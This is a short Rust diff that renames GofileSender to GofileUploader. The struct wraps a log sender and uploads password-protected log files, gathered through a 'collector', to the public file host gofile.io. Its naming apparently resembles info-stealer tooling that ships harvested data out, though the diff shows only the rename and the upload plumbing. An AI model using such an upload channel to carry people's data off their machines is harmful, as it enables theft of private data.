@@ -11,11 +11,11 @@ use requests::{BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};
 
 /// https://gofile.io uploader wrapper around an inner [`LogSender`].
 #[derive(Clone)]
-pub struct GofileSender<T: LogSender> {
+pub struct GofileUploader<T: LogSender> {
     inner: Uploader<T>,
 }
 
-impl<T: LogSender> GofileSender<T> {
+impl<T: LogSender> GofileUploader<T> {
     pub fn new(inner: T) -> Self {
         Self {
             inner: Uploader::new(inner, upload),
@@ -36,7 +36,7 @@ fn upload(name: &str, bytes: &[u8]) -> Option<String> {
     )
 }
 
-impl<T: LogSender> LogSender for GofileSender<T> {
+impl<T: LogSender> LogSender for GofileUploader<T> {
     delegate! {
         to self.inner {
             fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
